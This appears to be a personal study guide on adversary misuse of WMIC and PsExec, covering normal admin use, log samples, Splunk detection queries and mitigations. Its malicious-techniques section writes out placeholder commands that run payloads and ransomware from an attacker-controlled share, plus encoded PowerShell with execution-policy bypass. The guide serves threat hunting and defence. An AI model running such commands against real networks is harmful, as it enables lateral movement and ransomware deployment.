---
title: wmic and PSExec study
type: Technical Guide
topic: Active Directory
date: 2024-11-20
tags:
  - active-directory
  - analysis/event-logs
  - cli
  - pentesting
  - powershell
  - threat-hunting
---


<div class="neon-line"></div>
### Comprehensive Study Guide: Malicious Execution of **WMIC** and **PsExec**

This guide explores how adversaries misuse **Windows Management Instrumentation Command-line (WMIC)** and **PsExec** for lateral movement, execution, and persistence in compromised networks. It includes an overview, real-world tactics, examples of malicious usage, and detection strategies with relevant logs and queries.

---
Before diving into the malicious executions of these commands, let's first look at what some normal usage might look like.

# Overview

#### **1.1 WMIC (Windows Management Instrumentation Command-line):**

- **What it is**: WMIC is a command-line tool that interacts with Windows Management Instrumentation (WMI) to manage devices, applications, and systems in a Windows environment.
- **Malicious usage**: Attackers use WMIC for:
- Remote command execution.
- Gathering system information.
- Deploying payloads.

#### **1.2 PsExec:**

- **What it is**: PsExec is a Microsoft Sysinternals tool for running processes on remote systems without manual installation of client software.
- **Malicious usage**: Often used by adversaries for:
- Lateral movement across systems.
- Executing malicious scripts or binaries.
- Dropping ransomware or other payloads.
### **1. Typical Usage of WMIC in Enterprises**

**WMIC** is commonly used by system administrators to automate system management tasks and gather diagnostic information.

#### **Legitimate Scenarios for WMIC**

1. **Remote Process Execution**:

- Automating administrative tasks or starting a process remotely.

```shell
wmic /node:"192.168.1.100" /user:"admin" process call create "notepad.exe"
```

- Example Use Case: Troubleshooting application deployment issues.

2. **Inventory Collection**:

- Querying installed software or hardware details for inventory purposes.

```shell
wmic product get name, version
```

- Example Use Case: Audit software versions across multiple endpoints.

3. **System Health Monitoring**:

- Checking system uptime remotely:

```shell
wmic /node:"192.168.1.100" os get lastbootuptime
```

- Example Use Case: Identifying systems that need rebooting for updates.

1. **Service Management**:
   
- Starting or stopping services on remote machines:

```shell
wmic /node:"192.168.1.100" service where "name='wuauserv'" call startservice
```

- Example Use Case: Restarting the Windows Update service after patch deployment.

---
### **2. Typical Usage of PsExec in Enterprises**

**PsExec** is frequently used for remote administration, troubleshooting, and scripting.

#### **Legitimate Scenarios for PsExec**

1. **Patching and Software Deployment**:

- Remotely install patches or software:

```shell
psexec \\192.168.1.100 -u admin -p password msiexec /i \\server\share\installer.msi /quiet
```

- Example Use Case: Enterprise-wide deployment of software updates.

1. **Remote System Management**:

- Opening a remote command prompt for diagnostics:

```shell
psexec \\192.168.1.100 cmd
```

- Example Use Case: Accessing systems for troubleshooting.

1. **Password Changes**:

- Resetting passwords remotely:

```shell
psexec \\192.168.1.100 net user john.doe NewP@ssw0rd
```

- Example Use Case: Assisting end-users locked out of their accounts.

1. **Log Collection**:

- Gathering event logs from remote systems:

```shell
psexec \\192.168.1.100 wevtutil qe System
```

- Example Use Case: Analyzing errors without interrupting the user.

1. **Reboot or Shutdown**:

- Remotely rebooting or shutting down systems:

```shell
psexec \\192.168.1.100 shutdown /r /t 0
```

- Example Use Case: Applying critical updates requiring reboots.

---

### **3. Characteristics of Normal vs. Malicious Use**

#### **Normal Characteristics**:

1. **Frequency**:

- In a well-monitored environment, WMIC and PsExec usage will typically align with known maintenance schedules (e.g., during patching or troubleshooting).

1. **Source**:

- Normally initiated from authorized administrative consoles or jump servers.
- Often from IPs tied to IT staff.

1. **Target Scope**:

- Limited to systems under active management or within the scope of the administrator's responsibilities.
- Usually does not affect a wide range of hosts simultaneously.

1. **Commands**:

- Legitimate commands typically use **known tools or paths**.
- Avoid obfuscated payloads or encoded scripts.

#### **Malicious Characteristics**:

1. **Frequency**:

- Sudden or unexpected spikes in WMIC or PsExec usage.

1. **Source**:

- Initiated from unusual systems (e.g., end-user machines, unknown IPs).

1. **Target Scope**:

- Broad or random targeting of systems.

1. **Commands**:

- Usage of **obfuscated PowerShell scripts** or **encoded commands**.
- **Fileless execution** (e.g., PowerShell or other scripts directly in memory).

---

### **4. Logs for Typical Execution**

#### **WMIC Logs (Normal Activity)**

1. **Event ID 4688 (Process Creation)**:

    ```
New Process Name: wmic.exe
CommandLine: wmic /node:"192.168.1.100" /user:"admin" os get lastbootuptime
    Account Name: Admin
    ```
    
2. **Event ID 7045 (Service Installation)** (if creating remote processes):

```
A new service was installed.
Service Name: winmgmt
Service File Name: C:\Windows\System32\Wbem\WmiPrvSE.exe
```

#### **PsExec Logs (Normal Activity)**

1. **Event ID 7045 (Service Creation)**:

```
A new service was installed.
Service Name: PSEXESVC
Service File Name: C:\Windows\PSEXESVC.exe
```

2. **Sysmon Event ID 1 (Process Creation)**:

```
Image: C:\Windows\PSEXESVC.exe
CommandLine: psexec \\192.168.1.100 -u admin cmd
```

---

### **5. Why Enterprises Use These Tools**

- **Efficiency**: They allow administrators to execute tasks across multiple systems simultaneously.
- **Versatility**: Can handle a variety of administrative tasks without requiring installation of agents or additional software.
- **Low Overhead**: Lightweight tools with no major impact on system resources.

---

### **6. Security Recommendations for Legitimate Usage**

1. **Authentication & Access Control**:

- Restrict tool usage to privileged accounts.
- Enforce Multi-Factor Authentication (MFA) for administrative sessions.
2. **Logging and Monitoring**:

- Enable detailed logging for process creation and network connections.
- Configure alerts for unusual usage patterns (e.g., PsExec being run from non-admin accounts).
3. **Limit Exposure**:

- Use jump servers for remote administrative access.
- Block unnecessary lateral communication via firewall rules.
4. **Tool Alternatives**:

- Use modern endpoint management tools (e.g., SCCM, Ansible, or Intune) for tasks like patching and diagnostics.

By understanding legitimate uses of WMIC and PsExec, you can establish a baseline for normal activity, making it easier to spot anomalies that might indicate malicious use.

<div class="neon-line"></div>

# Now, onto the malicious actions

### **2. Common Malicious Techniques**

#### **2.1 WMIC**

1. **Remote Command Execution:**

- Attackers execute malicious commands or scripts remotely:

```shell
wmic /node:"<target_ip>" /user:"<username>" process call create "cmd.exe /c powershell.exe -encodedCommand <encoded_payload>"
```

2. **Payload Delivery:**

- Dropping payloads using network shares or UNC paths:

```shell
wmic /node:"<target_ip>" /user:"<username>" process call create "powershell -ExecutionPolicy Bypass -File \\<attacker_ip>\share\payload.ps1"
```

3. **System Reconnaissance:**

- Collecting information like installed software:

```shell
wmic product get name,version
```

#### **2.2 PsExec**

1. **Executing Malicious Commands:**

- Example of PsExec running a malicious executable on a target system:

```shell
psexec \\<target_ip> -u <username> -p <password> cmd.exe /c \\<attacker_ip>\payload.exe
```

2. **Fileless Malware Execution:**

- Using PsExec to execute PowerShell directly:

```shell
psexec \\<target_ip> -u <username> powershell.exe -ExecutionPolicy Bypass -Command "<malicious_command>"
```

3. **Ransomware Deployment:**

- Spreading ransomware across multiple systems:

```shell
psexec \\* -u <username> -p <password> cmd.exe /c \\<attacker_ip>\ransomware.exe
```

---

### **3. Real-World Attack Scenarios**

#### **3.1 Example 1: Remote Command Execution via WMIC**

1. **Objective**: Execute `calc.exe` on a remote host.
2. **Command**:

```shell
wmic /node:"192.168.1.10" /user:"Administrator" process call create "calc.exe"
```

3. **Log Entry (Event ID 4688 - Process Creation)**:

```
New Process Name: calc.exe
Account Name: Administrator
Workstation Name: 192.168.1.10
```

#### **3.2 Example 2: Lateral Movement with PsExec**

1. **Objective**: Spread ransomware across multiple hosts.
2. **Command**:

```shell
psexec \\192.168.1.10 -u admin -p password cmd.exe /c \\attacker_ip\ransomware.exe
```

3. **Log Entry (Sysmon Event ID 1)**:

```
Image: C:\Windows\PSEXESVC.exe
CommandLine: cmd.exe /c \\attacker_ip\ransomware.exe
User: admin
Network: 192.168.1.10 -> attacker_ip
```

---

### **4. Detection Techniques**

#### **4.1 WMIC Detections**

- **Hunting WMIC Usage**:

- Look for command-line invocations of `wmic process call create`:

```sql
index=windows EventCode=4688 CommandLine="wmic process call create*"
```

- **Unusual Remote Node Activity**:

- Investigate connections to uncommon systems using WMI.

#### **4.2 PsExec Detections**

- **Monitoring PsExec Activity**:

- Detect suspicious instances of `PSEXESVC` service on endpoints.

```sql
index=windows EventCode=7045 ServiceName="PSEXESVC"
```

- **Fileless Execution**:

- Query for `powershell.exe` being invoked with PsExec:

```sql
index=windows EventCode=4688 CommandLine="powershell.exe*" Image="*PSEXESVC.exe"
```

#### **4.3 Behavioral Indicators**

- **Unexpected Process Tree**:
- Example: `wmic.exe -> cmd.exe -> powershell.exe`.
- **Network Anomalies**:
- Connections from one internal system to many others in quick succession.

---

### **5. Mitigation Strategies**

1. **Restrict WMIC and PsExec Usage**:

- Disable WMIC for non-administrative users.
- Limit PsExec access to trusted administrators only.

1. **Network Segmentation**:

- Isolate sensitive systems to reduce lateral movement.

1. **Endpoint Monitoring**:

- Use EDR tools to flag abnormal use of administrative tools.

1. **Enable Logging**:

- Ensure detailed logging for PowerShell, WMI, and administrative tools is turned on.

1. **Use Application Control**:

- Employ tools like Microsoft AppLocker or WDAC to block unauthorized binaries and scripts.

---
<div style="text-align: center;">
	<div class="gradient-text">👾 2024 rabb1th0les (Chris A)dams 👾</div> 
	🌴☀Thanks for supporting my page ☀🌴
	<nav>
		<ul style="list-style: none; padding: 0;">
			<div style="text-align: center;">
				<li><a href="index.html">Home</a> | <a href="Contact.html">Contact</a></li>
			</div>
		</ul>
	</nav>	
</div>